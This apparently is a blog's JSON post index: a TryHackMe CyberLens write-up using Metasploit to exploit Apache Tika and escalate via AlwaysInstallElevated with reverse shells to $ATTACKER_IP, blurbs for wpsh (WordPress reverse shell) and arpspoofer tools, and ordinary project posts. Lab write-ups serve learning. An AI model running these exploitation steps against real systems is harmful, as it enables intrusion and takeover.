[
  
  {
    "title": "TryHackMe | CyberLens",
    "url": "/posts/thm-cyberlens/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, windows, windows-privesc, metasploit",
    "date": "2024-12-26 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Cyberlens, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Windows server, before moving on to the pr...",
    "content": "IntroductionHello everyone, today we will be taking a look at Cyberlens, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Windows server, before moving on to the privilege escalation phase using the Metasploit framework. Let‚Äôs get started !WalkthroughEnumerationAs always, we begin with a basic rustscan port scan, followed by an nmap scan with identification of services version, and we output the result to a file named all_ports.rustscan -a $TARGET_IP -- -sV -oN all_ports‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ cat all_portsPORT        STATE SERVICE       REASON  VERSION80/tcp      open  http          syn-ack Apache httpd 2.4.57 ((Win64))135/tcp     open  msrpc         syn-ack Microsoft Windows RPC139/tcp     open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn445/tcp     open  microsoft-ds? syn-ack 3389/tcp    open  mw-wbt-server syn-ack Microsoft Terminal Services5985/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)7680/tcp    open  panda-pub?    syn-ack 47001/tcp   open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)--------- lot of MSRPC opened ports, not of interest 61777/tcp   open  http          syn-ack Jetty 8.y.z-SNAPSHOTService Info: OS: Windows; CPE: cpe:/o:microsoft:windows We learn a few essential things from this scan:  The target is running Windows Server  There are 4 HTTP servers, as well as SMB and RDP runningSMB (139, 445)I like to start by enumerating SMB because it‚Äôs relatively quick. So I ran:‚îå‚îÄ‚îÄ(kali„âøkali)-[~]‚îî‚îÄ$ smbclient -L \"\\\\\\\\$TARGET_IP\\\\\"Password for [WORKGROUP\\kali]:session setup failed: NT_STATUS_ACCESS_DENIEDUnfortunately, nothing interesting came up.HTTP (80)The main functionality of this server is to provide image metadata extraction. However, pressing Ctrl + U revealed no form in the HTML source code:&lt;div class=\"detail-box\"&gt;    &lt;div class=\"heading_container\"&gt;            &lt;h2&gt;CyberLens Image Extractor&lt;/h2&gt;        &lt;/div&gt;        &lt;p&gt; &lt;!-- Uninteresting text ... --&gt; &lt;/p&gt;        &lt;input type=\"file\" id=\"imageFileInput\"&gt;        &lt;button id=\"metadataButton\"&gt;Get Metadata&lt;/button&gt;    &lt;div id=\"metadataOutput\"&gt;&lt;/div&gt;&lt;/div&gt;That means that the metadata extraction functionality is probably handled by JavaScript. Scrolling further in the HTML source code, I found the following JavaScript code, where I removed irrelevant part:document.getElementById(\"metadataButton\").addEventListener(\"click\", function() {    var fileInput = document.getElementById(\"imageFileInput\");    var reader = new FileReader();    var fileData = reader.result;    fetch(\"http://cyberlens.thm:61777/meta\", {        method: \"PUT\",        body: fileData,        headers: {            \"Accept\": \"application/json\",            \"Content-Type\": \"application/octet-stream\"        }    })}As you can see, the JavaScript sends the file we uploaded and send on port 61777. This indicates that the service responsible for the metadata handling is indeed running on port 61777.HTTP 61777This seems to be a version disclosureLet‚Äôs take advantage of this significant version disclosure by running searchsploit on this Tika version:Searchsploit found a Metasploit module that matches the Tika versionExploitationLet‚Äôs start by launching Metasploit and searching for the Tika exploit we identified in the enumeration part.Metasploit exploit module for Tika 1.17After typing show options, we realize that a few options need to be configured:msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RHOSTS $TARGET_IPRHOSTS =&gt; $TARGET_IPmsf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RPORT 61777RPORT =&gt; 61777msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set LHOST $ATTACKER_IPLHOST =&gt; $ATTACKER_IPmsf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; run[*] Started reverse TCP handler on $ATTACKER_IP:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target is vulnerable.Within a few seconds, we‚Äôre greeted with a meterpreter session. Now, all that‚Äôs left is to grab the user flag!And we get our first flag !PrivescSince we are already in Metasploit, let‚Äôs use the integrated post/multi/recon/local_exploit_suggester. To do this, let‚Äôs start by backgrounding the meterpreter session by pressing Ctrl + Z, then run the following commands:msf6 &gt; use multi/recon/local_exploit_suggestermsf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1msf6 post(multi/recon/local_exploit_suggester) &gt; runThis is essentially a post-exploitation module that automatically tries different methods to identify a way to escalate our privileges. You can read more about it here.Metasploit‚Äôs local_exploit_suggester in actionThe scan reveals several vulnerabilities, but only one is explicitly marked as ‚Äúvulnerable‚Äù (and not simply as ‚Äúappears to be vulnerable‚Äù). You can learn more about the ‚ÄúAlways Install Elevated‚Äù feature on the Microsoft official doc and read this ressource for an Attacker perspective.  Users with limited privileges can exploit this feature by creating a Windows Installer installation package (MSI) that      Creates a new local account in the local Administrators group    Adds their current account to the local Administrators group    Installs malicious software    Performs other unauthorized activities  ‚Äì SourceLet‚Äôs give it a try !msf6 &gt; use exploit/windows/local/always_install_elevated [*] No payload configured, defaulting to windows/meterpreter/reverse_tcpAfter typing show options, we notice that some parameters need to be configured.msf6 exploit(windows/local/always_install_elevated) &gt; set SESSION 1msf6 exploit(windows/local/always_install_elevated) &gt; set LHOST $ATTACKER_IPmsf6 exploit(windows/local/always_install_elevated) &gt; set LPORT 9999msf6 exploit(windows/local/always_install_elevated) &gt; runAnd we rooted the roomConclusionIn conclusion, this challenge was a great root for beginners. We exploited a vulnerable Windows server and performed privilege escalation by targeting an outdated version of Apache Tika (leveraging a version disclosure) and chaining it with Metasploit‚Äôs local_exploit_suggester."
  },
  
  {
    "title": "wpsh",
    "url": "/posts/wpsh/",
    "categories": "Programming, Hacking tools",
    "tags": "programming, hacking",
    "date": "2024-12-25 16:00:00 +0000",
    





    
    "snippet": "üöÄ UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. ...",
    "content": "üöÄ UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. Once authenticated, the script establishes a reverse shell, granting access to the remote instance.wpsh help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "arpspoofer",
    "url": "/posts/arpspoofer/",
    "categories": "Programming, Hacking tools",
    "tags": "programming, hacking",
    "date": "2024-11-28 16:00:00 +0000",
    





    
    "snippet": "üöÄ UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect netwo...",
    "content": "üöÄ UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect network traffic through the attacker, enabling interception or modification of data.  In the help menu, you can see -g GATEWAY and -t TARGET. However, if you want to capture traffic between two victims without one of them being the gateway, you can still use this tool with -g TARGET1 and -t TARGET2.arpspoofer help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "Todo.js",
    "url": "/posts/todo-js/",
    "categories": "Programming, Web Dev",
    "tags": "programming",
    "date": "2024-07-04 16:00:00 +0000",
    





    
    "snippet": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more...",
    "content": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more. Tasks are stored in localStorage, ensuring that all modifications are persisted. Finally, the frontend is built using Tailwind.          SourceThe source code and installation instructions are accessible here.You can also test it directly in here."
  },
  
  {
    "title": "FTPy",
    "url": "/posts/ftpy/",
    "categories": "Programming, Networking",
    "tags": "programming, networking",
    "date": "2023-05-11 16:00:00 +0000",
    





    
    "snippet": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewComm...",
    "content": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewCommandsAuth  USER  PASSInteraction with files  PASV  LIST (ls)  RETR (get)  STOR (put)Interaction with filesystem  CD (cd)  PWD (pwd)  MKD (mkdir)  DELE (rm)  CHMOD (chmod)SourceThe source code and installation instructions are accessible here"
  },
  
  {
    "title": "Laravel Cybershop",
    "url": "/posts/laravel-ecommerce/",
    "categories": "Programming, Web Dev",
    "tags": "programming",
    "date": "2023-04-23 16:00:00 +0000",
    





    
    "snippet": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, s...",
    "content": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, some library like HTMX and Swiper, and Bootstrap for the front end part. I also used the Pusher websocket to create real-time notifications.General overviewThe products are sorted by categories. Each category has its own search bar, and there is a general search bar that searches across all categories. On the product display pages, you can see the products, their names, categories, prices, and average rating.          LoginYou can create an account with whatever email address you want, but you‚Äôll need to validate it by clicking on the link sent by email. You can reset your password using the same email address.          As you can see, livewire is used for the dynamic validation here.ProductYou can sell a product by adding it in the ‚Äúmarket‚Äù section. Give it a name, a price, a category, and a main image. You can also add secondary images. Finally, a MD-like editor is available for the product description (bold, italic, list, strikethrough text, links and so on).The drag &amp; drop functionnality is done with filepond.js.          CommentsYou can leave a comment on any product by adding a title, a rating, and your comment. Again, a markdown-like editor is available to help you style your text. Finally, you can ‚Äúheart‚Äù other people‚Äôs comments.          SettingsYou can customize your profile by changing your profile picture, email, or password. There is also a profile page displaying the products you are selling, the number of hearts your comments have received, your average product rating, the number of comments you have made, and a list of your recent comments.          PaymentWhen you add a product to your cart, it appears in the small dynamic cart icon in the navbar. Clicking on this cart icon takes you to a more detailed page where you also have the option to buy by making the payment (we have chosen to use Stripe).          I chose Livewire for the dynamic cart page.ChatboxThere is a chat that allows you to interact with sellers or other clients. It is dynamic and supports sending messages as well as images. Additionally, the notification component in the navbar uses WebSockets, making it real-time. Therefore, you will receive notifications instantly as they happen.          The dynamic notification component is updated using livewire + pusher.js websocket.SourceThe source code and installation instructions are accessible here.You‚Äôll also find a docker-compose file there if you want to test the application locally."
  },
  
  {
    "title": "PHP Chat",
    "url": "/posts/php-webchat/",
    "categories": "Programming, Web Dev",
    "tags": "programming",
    "date": "2023-02-16 16:00:00 +0000",
    





    
    "snippet": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentica...",
    "content": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentication and messages, coupled with a MariaDB database.On the other hand, the front-end is entirely handled by JavaScript with AJAX requests, and by Bootstrap + Vanilla CSS for the CSS part.Login          As you may noticed, the validation is done with AJAX, so it‚Äôs dynamic.Chat          The &lt;form&gt; is directly posted to the API. However, the update and delete fonctionnalities are done in JavaScript with AJAX requests.Settings page          The validation of the entered password is also done with AJAX requests.SourceThe source code and installation instructions are accessible hereYou‚Äôll also find a docker-compose file there if you want to test the application locally."
  }
  
]

